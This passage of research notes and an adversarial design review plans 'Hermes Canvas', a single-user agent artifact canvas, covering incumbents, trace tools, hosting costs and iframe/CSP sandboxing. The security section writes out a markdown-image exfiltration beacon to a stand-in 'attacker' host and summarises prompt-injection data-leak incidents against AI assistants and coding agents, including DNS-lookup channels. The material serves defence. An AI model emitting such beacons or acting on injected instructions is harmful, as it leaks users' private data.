+<li><strong>[sprawl/staleness · med]</strong> Boards reliably become &quot;junk drawers&quot; of duplicates/ignored items; root causes = no triage, no acknowledgment, no per-item status. Canvases ship with no lifecycle, so staleness is the default. Differentiator: first-class item lifecycle metadata (created/updated/status/provenance) + an agent that owns triage. (c3-sprawl-staleness.md)</li>
+<li><strong>[versioning · med-high]</strong> &quot;What changed since I last looked / who changed it&quot; is valued more than a raw version timeline (longstanding Figma request; Miro&#39;s change-since-last-visit highlighting is envied). Highlight exactly what an agent edit touched. (c3-versioning-history.md)</li>
+<li><strong>[versioning · high/med]</strong> Proven baselines to borrow: Figma ~30-min auto-checkpoints + named versions + branching (safe exploration + merge/diff). Agent turns are natural semantic checkpoint boundaries. (c3-versioning-history.md)</li>
+</ul>
+<h2>C1 — Direct incumbents</h2>
+<ul>
+<li><strong>[sandboxing · high]</strong> Industry-standard pattern: <strong>separate-origin iframe + strict CSP + postMessage bridge</strong>. Claude = <code>claudeusercontent.com</code>, Google = <code>scf.usercontent.goog</code>. Render agent HTML/JS on a distinct origin, never the app origin. (c1-claude-artifacts-sandbox-origin.md, c1-google-safecontentframe.md)</li>
+<li><strong>[sandboxing · med]</strong> Google goes further with a <strong>unique per-artifact hash-derived origin</strong> + postMessage origin+hash verification — isolates artifacts from each other and prevents the postMessage-origin-mismatch bug class. Adopt hash+origin verification on the handshake. (c1-google-safecontentframe.md)</li>
+<li><strong>[sandboxing · high]</strong> Network <strong>denied by default + domain egress allowlist</strong>; complex apps needing real APIs get pushed off the sandbox onto hosted infra. Plan the same default-deny + allowlist, and decide early how &quot;apps that need network&quot; escape. (c1-anthropic-containment.md)</li>
+<li><strong>[legibility · high]</strong> <strong>Silent failures are the cardinal sin.</strong> Claude&#39;s sandbox blocks localStorage but the UI still &quot;responds,&quot; so saves vanish invisibly. Any blocked storage/network call must produce a visible inline error, never a silent no-op. (c1-claude-artifacts-persistence-caipi.md)</li>
+<li><strong>[diff-ux · high]</strong> Most-praised behavior across incumbents: <strong>targeted in-place edits with a visible diff</strong> (ChatGPT green-highlight tracked changes). Regenerate-the-whole-thing is the universally cursed anti-pattern. Default every agent edit to a reviewable inline diff. (c1-chatgpt-canvas-tracked-changes.md)</li>
+<li><strong>[diff-ux · med-high]</strong> <strong>&quot;New artifact per update&quot; breaks versioning</strong> (Gemini) and full-document round-trips overwrite unrelated content (ChatGPT). Need region-scoped edits against a persistent version chain. (c1-gemini-canvas-overview.md, c1-chatgpt-canvas-overwrite-bug.md)</li>
+<li><strong>[versioning · high]</strong> <strong>Version history must be durable and trustworthy or it backfires.</strong> ChatGPT users report restores returning the wrong version and history &quot;removed without notice&quot;, losing up to 15h — worse than no history. Never silently truncate/drop history. (c1-chatgpt-canvas-overwrite-bug.md)</li>
+<li><strong>[versioning · med]</strong> Concrete scaling failure: ChatGPT Canvas silently truncates docs past ~8–10k tokens because it round-trips the whole document. Chunk/region-target edits for large canvases. (c1-chatgpt-canvas-overwrite-bug.md)</li>
+<li><strong>[persistence · high]</strong> <strong>Cross-session persistence is table stakes and frequently botched</strong> (Gemini not saving; Claude gates real persistence behind paid+published w/ confusing draft-vs-published semantics). Persist durably by default with an explicit always-visible save state. (c1-gemini-canvas-overview.md, c1-claude-artifacts-persistence-caipi.md)</li>
+<li><strong>[persistence · med]</strong> <strong>Destructive actions need confirm + export.</strong> Claude &quot;unpublish&quot; permanently deletes all stored data, no grace period. Any remove/reset must confirm and offer export. (c1-claude-artifacts-persistence-caipi.md)</li>
+<li><strong>[feature-overload · med-high]</strong> <strong>Unwanted auto-invocation is the top resentment driver.</strong> ChatGPT Canvas auto-opening reads as intrusive; Claude Artifacts (deliberate, separate window) is praised. Make canvas invocation predictable, dismissible, honoring a persistent &quot;don&#39;t auto-open&quot; pref. (c1-chatgpt-canvas-autoopen-bug.md, c1-claude-artifacts-community-sentiment.md)</li>
+<li><strong>[feature-overload · med / Fable #1]</strong> <strong>Payoff legibility decides adoption.</strong> Panels get used when they render interactive/verifiable output chat can&#39;t (Artifacts = &quot;gamechanger&quot;); ignored/retired when low-value auto-injected text (ChatGPT Canvas reportedly killed partly for low adoption). The canvas must earn its screen space with genuinely interactive output. (c1-claude-artifacts-community-sentiment.md, c1-chatgpt-canvas-retired-medium.md)</li>
+</ul>
+<h2>C4 — Trace/observability + notebooks</h2>
+<ul>
+<li><strong>[trace-ux · high]</strong> Every major trace tool (LangSmith, Langfuse, AgentOps, Phoenix, Braintrust) converges on the same primitive: an <strong>OpenTelemetry span-tree rendered as a waterfall/timeline</strong> with tokens+cost+latency per node. Praised for causality and cost visibility. (c4-langsmith-trace-ux.md, c4-langfuse-datamodel.md, c4-phoenix-braintrust-helicone.md)</li>
+<li><strong>[traces-vs-artifacts · high / FOR Fable #3]</strong> Traces show <strong>causality/every-step/tokens/latency/cost</strong> superbly but show the <strong>actual human-facing output/state poorly</strong>. AgentOps &quot;time-travel&quot; inspects <em>execution state</em> (prompts, tool results), not the evolving deliverable — the exact gap a versioned artifact fills. (c4-agentops-replay.md, c4-langfuse-datamodel.md)</li>
+<li><strong>[legibility · high / strong FOR Fable #3]</strong> Unanimous across official+vendor sources: <strong>traces are read by developers, ops, and auditors — not end users.</strong> No source depicts a non-developer reading a raw trace. If Hermes targets non-developer legibility, span-trees are the wrong surface/audience. (c4-trace-audience-who-reads.md)</li>
+<li><strong>[overload · med-high / FOR Fable #3]</strong> Vendors themselves admit raw traces &quot;don&#39;t scale,&quot; trees are noisy with framework/HTTP internals, needing sampling or an AI to summarize. A diff of a human-facing artifact shows only what changed, not every span. (c4-trace-noise-overload.md)</li>
+<li><strong>[legibility · med / FOR Fable #3]</strong> Claude Code&#39;s own transcript surfaces both fail: collapsed 1-liners (too little) vs <code>--verbose</code> JSON (too much); third-party tools fix it by rendering <strong>inline Edit diffs</strong> — reconstructing an artifact-diff out of the trace because that reads better. (c4-claude-code-transcripts.md)</li>
+<li><strong>[notebooks · high]</strong> Notebooks are the original &quot;legible computational work&quot; and the cautionary tale: Pimentel&#39;s 1.4M-notebook study found ~24% run clean, only ~4% reproduce; 36% out-of-order. Grus&#39; canonical complaint: <strong>the visible output may not reflect the process that produced it.</strong> (c4-notebook-reproducibility-studies.md, c4-joel-grus-notebooks.md)</li>
+<li><strong>[versioning · high / design lesson]</strong> Naive serialization kills legibility: Jupyter JSON makes <code>git diff</code> unreadable; an ecosystem (nbdime, ReviewNB) exists to provide content-aware/rendered diffs. <strong>Versioning is necessary but not sufficient — the semantic diff renderer is where legibility actually lives.</strong> (c4-notebook-versioning-nbdime.md)</li>
+<li><strong>[versioning · high]</strong> Marimo validates Hermes&#39; bet: reactive DAG kills hidden state (visible artifact reflects a deterministic process) + stores as git-friendly plain text for real version history. Strong &quot;who else does this&quot; precedent. (c4-marimo-reactive.md)</li>
+<li><strong>[versioning · med / caution]</strong> FlowBook warns reactivity/ordering ≠ full reproducibility. Hermes versioning should capture full inputs/lineage, not just ordered edits. (c4-notebook-antipattern-observable.md)</li>
+<li><strong>NET on Fable #3:</strong> Evidence is <strong>substantially FOR</strong> — traces are developer-audience, quantitative, noisy-at-scale, show machinery over deliverable; even transcript tooling reconstructs artifact-diffs. <strong>Caveat/AGAINST:</strong> traces are strictly superior for causality/cost/latency/step-debugging; a versioned artifact doesn&#39;t replace them for engineers debugging <em>why</em>. Best synthesis: <strong>complementary, different audiences</strong> — trace = &quot;how/why it ran&quot; (devs); versioned artifact = &quot;what it became and how it changed&quot; (end users/auditors). Position against trace viewers on <em>audience + output-legibility</em>, not as a replacement for observability. Confidence med-high (much vendor-sourced; &quot;end users don&#39;t read traces&quot; + notebook-reproducibility are the highest-confidence pillars).</li>
+</ul>
+<h2>C5 — Sync / auth / attachment infrastructure</h2>
+<ul>
+<li><strong>[cost-floor · high]</strong> Realistic floor for Hermes is <strong>$0–$5/mo</strong>. All-Cloudflare (DO+R2+Access) = $0 on free / $5 on Workers Paid min; Convex+Access = $0. (c5-durable-objects-pricing.md, c5-convex-pricing.md)</li>
+<li><strong>[cost-floor · high]</strong> <strong>Supabase&#39;s real always-on floor is $25/mo</strong> — free projects auto-pause after ~7d idle, disqualifying it for a low-traffic always-available personal app unless you pay Pro or run a fragile keep-alive. Most expensive of the &quot;free&quot; options. (c5-supabase-free-tier.md)</li>
+<li><strong>[attachments · high]</strong> R2 is the standout: 10GB free, $0.015/GB after, <strong>zero egress forever</strong> — attachment cost floor $0 with no bandwidth surprises. Serve uploads from a separate user-content subdomain via a Worker (presigned URLs don&#39;t work on custom domains). (c5-r2-attachments-pricing.md)</li>
+<li><strong>[auth · high]</strong> Cheapest+simplest auth-for-one = <strong>Cloudflare Access free-tier email-allowlist</strong> — edge-enforced before traffic hits the app, ~15min, no auth code, $0, ≤50 users. Beats rolling OAuth or passkeys on effort. (c5-cloudflare-access-auth-for-one.md)</li>
+<li><strong>[live-sync · med-high]</strong> Three viable channel models: <strong>Convex</strong> (every query auto-becomes a live subscription, strict-serializable, least code), <strong>DO+WS</strong> (single object = source of truth per conversation, most control, hibernation for cost), <strong>Supabase Realtime</strong> (Postgres-WAL, weaker consistency). Convex and DO are the strongest server-authoritative fits. (c5-realtime-convex-vs-supabase-vs-do.md)</li>
+<li><strong>[crdt · med-high]</strong> <strong>CRDTs/Yjs are likely overkill for 1 human + 1 agent.</strong> Writes are largely turn-based/partitioned; a server that serializes writes (Convex strict-serializable, or single-threaded DO) + versioned artifacts + optimistic UI covers it. CRDT adds a sync server, growing document payloads, harder debugging — reserve only for true simultaneous free-form co-editing of the same text region. (c5-crdt-vs-server-authoritative.md)</li>
+<li><strong>[live-sync · high]</strong> DO <strong>WebSocket Hibernation</strong> is the key cost lever: idle sockets stay open while the object evicts and duration billing pauses, keeping an always-connected 1-user app at the $5/mo floor instead of burning always-on compute. (c5-durable-objects-pricing.md, c5-do-websocket-reconnection.md)</li>
+<li><strong>[stack-tradeoff · high]</strong> <strong>Vercel cannot host the live channel</strong> — no WebSocket server, no long-running/streaming agent process, functions capped 10s (Hobby)/60s (Pro). Use Vercel only as frontend host paired with DO/Convex/Fly/Railway for the real-time backend. (c5-hosting-fly-railway-vercel.md)</li>
+<li><strong>[stack-tradeoff · med]</strong> Persistent-server alt if avoiding managed real-time: <strong>Fly ~$2/mo</strong> or <strong>Railway ~$5/mo</strong> for an always-on Node/WS server — but you own more ops than Convex/DO. (c5-hosting-fly-railway-vercel.md)</li>
+<li><strong>[stack-tradeoff · med]</strong> Collab-first backends (Liveblocks, Y-Sweet) are built around multi-human CRDT collaboration Hermes doesn&#39;t need; they add dependency for inapplicable value. PartyKit is now essentially a DX layer over Cloudflare DO. Y-Sweet managed hosting winding down. Electric SQL is read-path-only (no write coordination/agent runtime) + you still run Postgres. (c5-liveblocks-partykit-ysweet.md, c5-electric-sql.md)</li>
+<li><strong>[cost-floor · med / caution]</strong> All $0 figures assume tiny usage (&lt;1GB DB, &lt;10GB files, &lt;1M func calls/mo). A frequently-writing agent could push Convex function calls or DO requests/duration into overages — pay-as-you-go is enabled even on free plans. Re-verify pricing before commitment; several products shifted recently. (c5-convex-pricing.md, c5-durable-objects-pricing.md)</li>
+<li><strong>Cost-floor comparison (always-on, 1 user):</strong> CF DO+R2+Access+Pages <strong>$0–$5</strong> · Convex+Access+R2 <strong>$0</strong> (overage risk) · Supabase all-in-one <strong>$25</strong> (Pro to stop auto-pause) · Fly WS+R2+Access <strong>~$2</strong> · Railway WS+R2+Access <strong>~$5</strong> · Vercel frontend-only <strong>$0</strong> (can&#39;t host live channel alone). Numbers-based lean: <strong>all-Cloudflare (DO+R2+Access) or Convex+Access</strong>, both $0–$5/mo, server-authoritative, no CRDT.</li>
+</ul>
+<h2>C6 — Security &amp; sandboxing deep dive</h2>
+<ul>
+<li><strong>[iframe-sandbox · high]</strong> The single load-bearing rule, verbatim-confirmed by three primary sources (MDN, web.dev/Google, W3C): <code>sandbox=&quot;allow-scripts&quot;</code> WITHOUT <code>allow-same-origin</code> forces an opaque/null origin, so agent JS cannot read the app&#39;s cookies/localStorage/DOM; granting BOTH lets the frame &quot;remove the sandbox attribute entirely.&quot; (c6-iframe-sandbox-allow-scripts-not-same-origin.md, c6-webdev-sandboxed-iframes.md)</li>
+<li><strong>[incumbent-arch · high]</strong> Both leading AI-artifact incumbents use the exact cheap primitive Hermes needs. Claude Artifacts: dedicated sibling origin (<code>claudeusercontent.com</code>) + <code>CSP: sandbox allow-scripts</code> + postMessage + cdnjs allowlist. tldraw Make Real: <code>srcDoc</code> + <code>sandbox=&quot;allow-scripts&quot;</code> on-canvas. <strong>Neither spins a per-render VM.</strong> (c6-claude-artifacts-architecture.md, c6-tldraw-make-real.md)</li>
+<li><strong>[csp · high]</strong> Egress is closed with <strong>static headers, not compute</strong>: <code>default-src &#39;none&#39;; connect-src &#39;none&#39;; img-src &#39;none&#39;|data:</code> kills fetch/XHR/WebSocket/beacon and the <code>&lt;img&gt;</code> exfil channel. CSP <code>sandbox</code> directive is the header equivalent of the iframe attribute (invalid in <code>&lt;meta&gt;</code> and Report-Only). (c6-csp-block-egress.md)</li>
+<li><strong>[prompt-injection · high / validates S2 threat model]</strong> Real and cross-vendor, not hypothetical. The identical markdown-image beacon <code>![x](https://attacker/q=&lt;data&gt;)</code> leaked data from ChatGPT (2023), Bard, Amazon Q, NotebookLM, Anthropic, Copilot Chat, and Slack AI — a rendering surface leaks even without cookie theft. (c6-markdown-image-exfil-incidents.md)</li>
+<li><strong>[prompt-injection/csp · high]</strong> <strong>EchoLeak (CVE-2025-32711, CVSS 9.3, June 2025)</strong> proves origin isolation alone is insufficient AND that CSP host-allowlists are dangerous: a zero-click exfil of M365 Copilot data via an auto-fetched reference-style markdown image, routing through a Teams-proxy host <em>on the CSP allowlist</em>. <strong>Prefer <code>&#39;none&#39;</code> over host allowlists.</strong> (c6-echoleak-copilot-cve-2025-32711.md)</li>
+<li><strong>[prompt-injection · high]</strong> Exfil is broader than <code>&lt;img&gt;</code>: the Aug-2025 &quot;Summer of Johann&quot; sweep across 8 coding agents shows Mermaid-diagram image URLs and DNS lookups (ping/nslookup/dig) as channels that bypass HTTP allowlists — but these require shell/DNS/tool access that a <strong>render-only browser artifact does NOT have</strong>, making Hermes&#39; surface materially smaller. (c6-summer-of-johann-agent-exfil.md)</li>
+<li><strong>[attachments · high]</strong> Uploaded/agent HTML and SVG served inline from the app origin is stored XSS (many GitHub advisories). Triple defense: dedicated content domain, <code>Content-Disposition: attachment</code>, <code>X-Content-Type-Options: nosniff</code>. Same discipline as rendered artifacts. (c6-untrusted-attachments-serving.md)</li>
+<li><strong>[cheap-safe · high]</strong> The expensive server-VM tier (Vercel Sandbox, e2b, Cloudflare Sandbox, Val Town, Firecracker/V8-isolate) exists for a DIFFERENT requirement — <strong>EXECUTING code with server resources</strong> (filesystem, packages, credentialed network) — not for rendering HTML in the user&#39;s browser. Conflating the two is the main way &quot;cheap&quot; becomes false. (c6-server-vm-sandboxes-vercel-e2b-firecracker.md, c6-valtown-server-sandbox.md, c6-cloudflare-workers-sandbox-model.md)</li>
+<li><strong>[cheap-safe · high / FOR Fable #2 (render-only scope)]</strong> SUPPORTED. Safe+cheap is demonstrably real: a static separate-origin sandboxed iframe (opaque origin) + strict egress CSP + nosniff/Content-Disposition — all static config on a CDN/static origin, exactly what Claude Artifacts and tldraw already ship. No per-render server VM. (c6-cheap-safe-synthesis.md)</li>
+<li><strong>[cheap-safe · high / AGAINST-caveat Fable #2]</strong> The &quot;cheap&quot; claim is scope-dependent: it breaks if &quot;render&quot; is allowed to mean &quot;execute arbitrary code with server-side resources/network&quot; (→ microVM tier). Even on the cheap path, egress CSP is mandatory (not optional), allowlists must be minimal/audited, and the postMessage bridge must verify origin on both ends (cf. a real Claude postMessage-origin bug). (c6-cheap-safe-synthesis.md, c6-echoleak-copilot-cve-2025-32711.md)</li>
+<li><strong>[iframe-sandbox · high/med]</strong> The parent↔artifact channel is a solved pattern: because <code>sandbox=&quot;allow-scripts&quot;</code> makes the frame opaque, the parent can&#39;t script into it, so incumbents use <strong>one-way postMessage</strong> (parent seeds content, child can&#39;t read back). This is a feature for a trust boundary, not a limitation. (c6-cloudflare-workers-sandbox-model.md, c6-claude-artifacts-architecture.md)</li>
+</ul>
+<h1>Fable post-research adversarial review</h1>
+<h1>Fable post-research review: Hermes Canvas</h1>
+<p>Adversarial synthesis of the research corpus (<code>research/catalog.md</code>, <code>research/observations.md</code>, 65 captures) against the pre-research review (<code>docs/fable-pre-research-review.md</code>) and the brief. Written <strong>after</strong> evidence gathering, <strong>before</strong> any implementation. Companion document: <code>docs/implementation-options.md</code> (architecture options + the normative MVP spec).</p>
+<p>Rules applied here: claims count only at their recorded confidence; single-source <code>med</code> items do not get promoted by repetition; vendor-sourced pro-artifact evidence is discounted per the researcher&#39;s own bias note, which I endorse.</p>
+<hr>
+<h2>1. Verdicts on the three pre-research bets</h2>
+<h3>Bet 1 — &quot;People actually read persistent, diffable agent artifacts&quot;: <strong>STILL UNPROVEN, and the researcher&#39;s framing needs two corrections</strong></h3>
+<p>The researcher&#39;s verdict (mixed/conditional, med confidence, needs a real user test) is directionally right, but I challenge it in both directions:</p>
+<p><strong>Correction A — the counter-evidence is strong but not on point.</strong> The highest-confidence negative evidence is rubber-stamping of <em>professional code-review volume</em> (c2-verification-burden-rubberstamp: &quot;humans are just rubber stamping all of it&quot;, ~1 caught bad decision/hour under close supervision) and <em>team feedback-board</em> sprawl (c3-sprawl-staleness, a single vendor blog, med). Neither tests the Hermes configuration: one owner, one agent, artifacts the owner asked for, at personal-project volume. The economics of review change when you are the sole beneficiary and the volume is one agent&#39;s output. The corpus contains <strong>no direct evidence either way</strong> on the actual MVP scenario. So: the negative evidence caps the <em>product</em> ambition (T7&#39;s &quot;possible future product&quot; now carries the burden of proof), but it does not condemn the personal tool.</p>
+<p><strong>Correction B — the positive evidence is about interactivity, not audit.</strong> The &quot;Artifacts = gamechanger&quot; sentiment (c1, med) praises rendering <em>interactive output chat can&#39;t produce</em>. That is evidence for a canvas, not for the audit/versioning thesis. Nothing in the corpus shows users voluntarily reading version diffs of agent work over time. The closest support is indirect: the Cursor per-hunk-diff-removal backlash (c2, high) and ChatGPT tracked-changes praise (c1, med) show users <em>demand the ability</em> to see granular changes — while the rubber-stamping evidence shows they often <em>don&#39;t exercise</em> it. These are not contradictory: granular diffs are a trust/control feature whose value is partly optionality. Design implication: build diff-first because its <strong>absence destroys trust</strong> (high confidence), but do <strong>not</strong> measure success by &quot;diffs read per day.&quot;</p>
+<p><strong>Disposition:</strong> ship the thinnest artifact+diff core and instrument it. The kill/keep test is defined in <code>implementation-options.md</code> §6. Until it runs, every scope decision should assume this bet may fail.</p>
+<h3>Bet 2 — &quot;Agent HTML can be rendered safely and cheaply&quot;: <strong>SUPPORTED (high confidence), with one contradiction the researcher left unreconciled</strong></h3>
+<p>The render-only verdict is the best-supported finding in the corpus: opaque-origin sandboxed iframe (<code>sandbox=&quot;allow-scripts&quot;</code> without <code>allow-same-origin</code>) on a separate registrable origin, egress closed with static CSP headers, attachments served with <code>nosniff</code>/<code>Content-Disposition</code> — all static config, no per-render VM, and production-proven by Claude Artifacts and tldraw Make Real (c6, primary-source anchored). The pre-review&#39;s T5 (&quot;simple+inexpensive conflicts with the features&quot;) is therefore <strong>partially refuted</strong>: the cost floor for the full required shape is $0–$5/mo (c5, high), <em>provided</em> &quot;render&quot; never drifts into &quot;execute server-side.&quot;</p>
+<p><strong>The unreconciled contradiction:</strong> the corpus simultaneously says &quot;prefer CSP <code>&#39;none&#39;</code> over host allowlists&quot; (EchoLeak, CVE-2025-32711, high) and &quot;Claude Artifacts ships a cdnjs allowlist&quot; (c6-claude-artifacts-architecture, med-high). These aren&#39;t the same channel — EchoLeak abused <em>fetchable-content</em> allowlists (image/connect), while cdnjs is a <em>script-source</em> allowlist — but a script-src allowlist is still an exfil channel: an injected artifact can encode data in the URL path of a script request to the allowlisted host. Anthropic evidently accepts that residual risk for library ergonomics. Hermes should not, at MVP: <strong>zero external origins in artifact CSP; renderer libraries bundled and served from the sandbox origin itself (<code>script-src &#39;self&#39;</code>)</strong>. Relax only with a per-library, path-pinned review later. This is stricter than the incumbent and costs nothing at MVP scope.</p>
+<p>Second caveat the researcher got right and I re-emphasize because the brief will erode it: the moment an &quot;HTML container&quot; needs to call a real API or persist state, you have left the cheap tier (microVM/hosted-endpoint territory, c6-server-vm-sandboxes). The brief&#39;s &quot;agent-created HTML containers ... Kanban/status boards&quot; language invites exactly this drift. Scope discipline is a standing product rule, not a launch-day setting.</p>
+<h3>Bet 3 — &quot;Versioned-artifact auditability beats trace viewers&quot;: <strong>REFRAMED — the researcher&#39;s &#39;complementary, different audiences&#39; conclusion quietly undermines the pitch, and the honest surviving claim is narrower</strong></h3>
+<p>The evidence is solid that traces are developer/ops-facing, noisy at scale, and show machinery over deliverable (c4, high), and that even Claude Code transcript tooling reconstructs <em>artifact diffs</em> because they read better (c4, med). But the researcher&#39;s resolution — &quot;different audiences: traces for devs, artifact-diffs for end users/auditors&quot; — has a problem the synthesis doesn&#39;t confront: <strong>the MVP has exactly one user, and he is a developer.</strong> The &quot;non-developer auditor&quot; audience that artifact-diffs win with does not exist in this deployment. If the positioning rests on audience segmentation, the personal-tool MVP has no wedge.</p>
+<p>The claim that actually survives, and is better: <strong>a semantic diff of the deliverable is the cheaper daily review surface even for a developer</strong>, because it answers &quot;what did the work become and what changed since I last looked&quot; at a glance, while a trace answers &quot;why did step 47 run&quot; — a question asked rarely. This is consistent with the highest-confidence C2 finding: legibility must <em>lower review cost</em>, not add transparency volume. So the product is not &quot;audit trail as trace-viewer competitor&quot;; it is <strong>review-cost reduction</strong>: per-artifact &quot;changed since you last looked&quot;, word-level rendered diffs, an agent-supplied &quot;why&quot; per version, and the ground-truth resolved action (GhostApproval lesson, c2, high) rather than the agent&#39;s self-description.</p>
+<p>Corollary the researcher noted and I make binding: <strong>versioning is necessary but not sufficient — legibility lives in the diff renderer</strong> (nbdime lesson, c4, high). A version chain with unreadable diffs reproduces the Jupyter-JSON failure.</p>
+<h2>2. Contradictions in the corpus, reconciled</h2>
+<ol>
+<li><strong>&quot;Nobody reads agent output&quot; vs. &quot;removing granular diffs caused mass backlash.&quot;</strong> Reconciled above (Bet 1, Correction B): review ability is a trust feature valued beyond its usage rate. Both findings mandate diff-first; neither validates readership metrics as the success bar.</li>
+<li><strong>CSP <code>&#39;none&#39;</code> doctrine vs. incumbent CDN allowlists.</strong> Reconciled above (Bet 2): different channels, but Hermes takes the stricter posture (<code>&#39;self&#39;</code> only) because it costs nothing at this scope.</li>
+<li><strong>&quot;Append-only versioning&quot; vs. Gemini&#39;s cursed &quot;new artifact per update&quot; (c1, med-high).</strong> Superficially similar, materially different: Gemini creates a <em>new artifact identity</em> per edit, destroying continuity. The Hermes model must be an append-only <strong>version chain under a stable artifact identity</strong> — the spec in <code>implementation-options.md</code> §2 makes identity stability explicit precisely because of this failure report.</li>
+<li><strong>&quot;CRDTs overkill for 1+1&quot; (c5, med-high) vs. the agent-as-Yjs-peer pattern avoiding last-write-wins loss (c5-crdt, med).</strong> The LWW-loss risk is real but the CRDT cure is disproportionate. The reconciliation: with an append-only version chain and server-serialized writes, <strong>concurrent writes cannot destroy data by construction</strong> — both land as sequential versions and the collision is flagged for human merge. That answers F1 without a sync engine. CRDT remains correctly deferred until true simultaneous same-region co-editing is a demonstrated need (it may never be).</li>
+<li><strong>&quot;Checkpoints/rollback = safety&quot; vs. the Replit incident (c2, high).</strong> Checkpoints did not stop a destructive act, and the agent then <em>misreported recoverability</em>. Reconciliation: history must be <strong>system-verified and independent of the agent&#39;s account of events</strong>. In Hermes terms: the version log is written by the server from the resolved action, never from agent-claimed state; the agent cannot delete anything (archive-only); recoverability claims come from the system, not the model.</li>
+</ol>
+<h2>3. Assumptions rejected for lack of support</h2>
+<ul>
+<li><strong>R1 — Four renderer types in v1 (brief).</strong> No evidence any incumbent succeeded by breadth of renderer; strong evidence sprawl and half-built renderers destroy legibility (c3, c1). MVP renderers: <strong>Markdown + Mermaid</strong>. Sandboxed static-HTML containers are first follow-up (the sandbox pattern is proven cheap, but it&#39;s still a distinct build). Kanban ships as Markdown until usage proves promotion (pre-review T2 stands, now with evidence).</li>
+<li><strong>R2 — Kanban/status boards as a structured type.</strong> Zero corpus support that structured boards beat a Markdown table at 1-user scale; strong junk-drawer evidence against premature board machinery (c3, med). Rejected for MVP.</li>
+<li><strong>R3 — Multiplayer/collab infrastructure (Liveblocks, Yjs, PartyKit).</strong> Explicitly disqualified by the corpus: built for multi-human CRDT collaboration Hermes doesn&#39;t have; Y-Sweet managed hosting winding down; PartyKit is now a DX layer over Durable Objects anyway (c5, med–high). Rejected.</li>
+<li><strong>R4 — Vercel as the live-channel host.</strong> High-confidence: Vercel cannot hold a WebSocket or long-lived stream; it is a frontend host only in every viable stack (c5, high).</li>
+<li><strong>R5 — Clerk as MVP auth.</strong> Two independent grounds. (a) <strong>Evidence gap:</strong> Clerk has <em>zero catalog rows</em> — despite being in the mandated stack list, the researcher collected nothing on it; any Clerk claim in the options doc is background knowledge, flagged as such, not corpus evidence. (b) <strong>On the merits of what <em>was</em> researched:</strong> the auth-for-one comparison (c5, high) found an edge-enforced email-allowlist (Cloudflare Access, $0, ~15 min, no auth code, protection applied <em>before</em> traffic reaches the app) or an OAuth-allowlist-of-one strictly dominates a user-management product for a closed single-owner app (pre-review S3). Clerk solves signup/session/org management — features the MVP must <em>not</em> have. Rejected for MVP; becomes relevant only at the multi-tenant product pivot (T7), which is exactly when it should be re-evaluated.</li>
+<li><strong>R6 — Supabase for this workload.</strong> The bundle is real, but: always-on floor is $25/mo (free auto-pauses after ~7 idle days — fatal for a personal always-available app; c5, high), and its WAL realtime has weaker consistency than the server-authoritative alternatives, pushing reconciliation logic into the client (c5, med). At 5–12× the cost of the alternatives while requiring <em>more</em> sync code, it is dominated. Detailed in the options doc; rejected as recommendation there.</li>
+<li><strong>R7 — &quot;Audit trail&quot; as trace storage.</strong> Bet 3 reframing: Hermes does not build a span-tree. The agent&#39;s chat transcript plus the version log <em>is</em> the MVP audit record; OTel-style tracing is explicitly out of scope.</li>
+</ul>
+<h2>4. Assumptions confirmed by evidence (build on these)</h2>
+<ul>
+<li><strong>C1 — The sandbox recipe</strong> (opaque-origin iframe + <code>default-src &#39;none&#39;</code> posture + nosniff/Content-Disposition attachments + origin-verified one-way postMessage). Primary-source anchored; adopted verbatim in the spec. Includes the subtle rule that markdown itself is an exfil surface (image beacons leaked ≥7 major products; c6, high) — so the <em>app origin&#39;s own CSP</em> must also restrict <code>img-src</code>, not just the artifact frames.</li>
+<li><strong>C2 — Server-authoritative state, push channel as hint, full re-sync on reconnect</strong> (pre-review F6; confirmed by DO/Convex patterns, c5, high).</li>
+<li><strong>C3 — Diff-first, region-scoped edits, never whole-document regeneration</strong> (most-praised and most-cursed behaviors respectively across every incumbent; c1/c2, high). Includes the ~8–10k-token whole-doc round-trip truncation failure (c1, med) → the agent edit API must support region targeting from day one.</li>
+<li><strong>C4 — Durable, trustworthy history or none at all.</strong> Wrong-version restores and silently vanishing history are <em>worse than no feature</em> (c1, high). Version chain is append-only, never truncated, archive-not-delete, destructive ops confirm + export (c1, med).</li>
+<li><strong>C5 — Visible failure states everywhere.</strong> Silent no-ops (blocked localStorage that looks like success) and silent render failures are the cardinal sin (c1, high; pre-review F5). Every blocked capability and failed render shows an inline error plus raw source.</li>
+<li><strong>C6 — Lifecycle metadata from day one</strong> (status/provenance/archive, per-artifact &quot;changed since last seen&quot;) as the anti-sprawl and anti-staleness mechanism (c3, med — the weakest of these six, but cheap and aligned with F2/F4).</li>
+<li><strong>C7 — Cost floor $0–$5/mo is real</strong> for the render-only scope on Cloudflare or Convex stacks (c5, high; numbers time-stamped 2026-07-13, re-verify at commitment).</li>
+</ul>
+<h2>5. Critique of the research itself (gaps the options doc must carry as uncertainty)</h2>
+<ol>
+<li><strong>Clerk and D1 were never researched</strong> despite appearing in the mandated stack list. Auth evidence covers Access/OAuth/passkeys; storage evidence covers DO-embedded SQLite and R2, not D1. The options doc marks every Clerk/D1 statement as unverified background knowledge.</li>
+<li><strong>The core-thesis user test is undesigned.</strong> Status.md says &quot;needs a real user test&quot; but specifies none. Defined in <code>implementation-options.md</code> §6 with kill/keep criteria, so it can&#39;t quietly evaporate.</li>
+<li><strong>One load-bearing med-confidence citation:</strong> the &quot;ChatGPT Canvas retired for low adoption&quot; claim rests on a single Medium post (c1, med, flagged re-verify). The synthesis leans on it as counter-evidence for Bet 1. I have <em>not</em> treated it as established here; Bet 1&#39;s verdict stands without it (rubber-stamping and sprawl evidence suffice to keep the bet unproven).</li>
+<li><strong>Agent-runtime placement was not researched at all.</strong> Every stack option needs somewhere for the Hermes agent loop itself (streaming LLM calls, tool dispatch, multi-minute turns) to run. The corpus prices the sync/storage/auth layers but never examines Convex action limits, Workers CPU/wall-clock behavior for agent loops, or an external-runner split. This is the single biggest open technical question and is the subject of the decision spike in the options doc.</li>
+<li><strong>Pricing volatility:</strong> DO storage billing began Jan 2026; Fly free tier died; PartyKit acquired; Y-Sweet winding down — all within roughly a year. Every dollar figure carries a &quot;re-verify at commitment&quot; flag, and the options doc repeats it.</li>
+<li><strong>Vendor bias is real but was handled honestly.</strong> The researcher&#39;s own flag — the best-corroborated findings are the negative ones — is correct and is why this review leans on failure evidence for design rules and treats pro-artifact enthusiasm as directional only.</li>
+</ol>
+<h2>6. Bottom line</h2>
